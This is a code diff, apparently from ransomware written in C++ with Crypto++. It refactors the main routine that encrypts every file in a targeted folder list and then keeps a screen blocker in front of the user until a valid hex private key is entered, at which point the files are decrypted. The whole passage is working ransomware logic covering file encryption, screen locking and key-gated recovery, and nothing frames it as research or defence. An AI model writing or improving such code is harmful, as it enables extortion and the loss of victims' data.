@@ -42,16 +42,22 @@ int main(int argc, char *argv[])
             exit(0);
         }
 
-        try {
-            folderservice.list_files_and_decrypt(encryptor, key);
-        } catch (Exception ex) {
-            std::cout<<"[Error] decryption"<<std::endl;
-            unblock = false;
+        encryptor->checkPrivateKey(key);
+
+        std::vector<std::string> files = folderservice.list_files_for_decryption();
+
+        for (std::string filePath : files) {
+            encryptor->decryptFile(filePath, key);
         }
+
         exit(0);
     }
 
-    folderservice.list_files_and_encrypt(encryptor);
+    std::vector<std::string> files = folderservice.list_files_for_encryption();
+
+    for (std::string filePath : files) {
+        encryptor->encryptFile(filePath);
+    }
 
     while(!unblock) {
         screenBlocker->show();
@@ -63,19 +69,29 @@ int main(int argc, char *argv[])
             key = Qkey.toStdString();
         }
 
-        try {
-            if(!is_hexa(key)) {
-                std::cout<<"Wrong key type!"<<std::endl;
-                throw new Exception(CryptoPP::Exception::OTHER_ERROR, "Wrong key type!");
-            }
-
-            encryptor->checkPrivateKey(key);
-            folderservice.list_files_and_decrypt(encryptor, key);
-            unblock = true;
-        } catch (Exception ex) {
-            std::cout<<"[Error] decryption"<<std::endl;
-            screenBlocker->clearKey();
+        if(!is_hexa(key)) {
+            std::cout<<"Wrong key type!"<<std::endl;
             unblock = false;
+        } else {
+            try {
+                encryptor->checkPrivateKey(key);
+
+                std::vector<std::string> files = folderservice.list_files_for_decryption();
+
+                for (std::string filePath : files) {
+                    encryptor->decryptFile(filePath, key);
+                }
+                unblock = true;
+
+            } catch(SignatureVerificationFilter::SignatureVerificationFailed keyVerifFailedException) {
+                std::cout<<"[KEY-ERROR]"<<keyVerifFailedException.what()<<std::endl;
+                screenBlocker->clearKey();
+                unblock = false;
+            } catch(Exception ex) {
+                std::cout<<"[DECRYPTION-ERROR] Error when decrypting files: "<<ex.what()<<std::endl;
+                screenBlocker->clearKey();
+                unblock = false;
+            }
         }
     }
     delete encryptor;
